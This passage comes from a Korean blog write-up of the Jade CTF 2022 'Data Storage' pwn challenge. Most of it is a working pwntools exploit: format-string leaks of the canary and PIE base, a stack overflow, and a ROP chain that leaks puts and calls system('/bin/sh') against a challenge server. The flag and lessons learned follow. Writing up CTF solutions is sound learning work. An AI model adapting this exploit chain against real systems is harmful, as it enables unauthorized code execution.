<p>canary leak을 성공하고 흐름 돌리는 것도 성공하면 이제 pie leak을 하면 된다. pie leak도 canary를 leak한 것과 동일하게 진행하면 된다. 다만 차이점은 canary는 rip를 바꾸면서 검증이 바로 되어서 알 수 있는 반면에 pie는 offset과 함께 출력해주면서 pie 주소인 것을 leak하면 된다.</p>
<p>그렇게 구한 leak할 pie offset은 85이다.</p>
<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><p>문제 풀 때의 기억을 살리고 싶어서 그 때 작성했던 익스 코드를 그대로 올린다.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        off = <span class="number">77</span></span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        <span class="comment">#off = off+1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#print(off, hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        log.info(<span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">off = 30</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        off = 85 </span></span><br><span class="line"><span class="string">        find_pie = &#x27;%&#x27;+str(off)+&#x27;$p&#x27;</span></span><br><span class="line"><span class="string">        p.sendline(find_pie)</span></span><br><span class="line"><span class="string">        #off = off+1</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;: &#x27;)</span></span><br><span class="line"><span class="string">        leak = p.recvline()</span></span><br><span class="line"><span class="string">        pie = int(leak[2:],16)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        print(off, hex(pie))</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;correct?\n&#x27;, b&#x27;yes&#x27;)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        payload = b&#x27;&#x27;</span></span><br><span class="line"><span class="string">        payload += b&#x27;A&#x27; * (0x210-0x8)</span></span><br><span class="line"><span class="string">        payload += p64(canary)</span></span><br><span class="line"><span class="string">        payload += b&#x27;B&#x27; * 0x8</span></span><br><span class="line"><span class="string">        payload += b&#x27;\x78\x15&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;:\n&#x27;, payload)</span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;]?\n&#x27;)</span></span><br><span class="line"><span class="string">        continue</span></span><br><span class="line"><span class="string">    except Exception as e:</span></span><br><span class="line"><span class="string">        print(e)</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">        #p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="string">        p = remote(&#x27;34.76.206.46&#x27;, 10003)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;%85$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1577</span></span><br><span class="line">info(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = pie+<span class="number">0x1663</span></span><br><span class="line">ret = pie+<span class="number">0x909</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line"><span class="comment">#payload += p64(ret)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(pie + elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line"><span class="comment">#leak = int(p.recv(14)[:-1].decode(), 16)</span></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;puts leak :: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts 6a0</span></span><br><span class="line"><span class="comment">#gets d90</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc_base = leak - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">info(&#x27;libc base :: &#x27;+ hex(libc_base))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system = libc_base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">system = leak - <span class="number">0x2a300</span></span><br><span class="line">binsh = leak + <span class="number">0x11d7b7</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;asdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;sh3llc0ding_but_w1th_4_tw1st&#125;</span><br></pre></td></tr></table></figure>

<h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>롸업 적으니까 이 문제는 매우 간단한 문제임을 깨달았다. 부끄럽지만 pie가 걸려있는데 어떻게 ROP를 해야할지 고민을 했다. 일단 local에서 진행할 때도 마지막 2 바이트만 덮을 생각을 못했었고, local 후에 remote의 libc가 다른데 pie가 걸려있는데 그걸 어떻게 알아내야 하는지.. 등등 고민을 꽤나 했다. (offset을 브포하면 된다.)</p>
<p>이 문제 덕에 주소 일부만 덮을 수 있다는 생각과 루프, try-except 등을 이용하여 offset을 구하는 과정을 배울 수 있었다.</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">2.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Source Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pre-work"><span class="toc-number">3.2.</span> <span class="toc-text">pre-work</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-canary-amp-pie"><span class="toc-number">3.2.1.</span> <span class="toc-text">leak canary &amp; pie</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.3.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">3.4.</span> <span class="toc-text">Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tmi"><span class="toc-number">4.</span> <span class="toc-text">tmi</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/jadectf2022-data_storage/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/jadectf2022-data_storage/&text=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/jadectf2022-data_storage/&is_video=false&description=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Jade CTF 2022 - Data Storage (canary, pie)&body=Check out this article: https://jiravvit.github.io/jadectf2022-data_storage/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/jadectf2022-data_storage/&title=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/jadectf2022-data_storage/&name=Jade CTF 2022 - Data Storage (canary, pie)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/jadectf2022-data_storage/&t=Jade CTF 2022 - Data Storage (canary, pie)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    jir4vvit
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'jiravvit-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
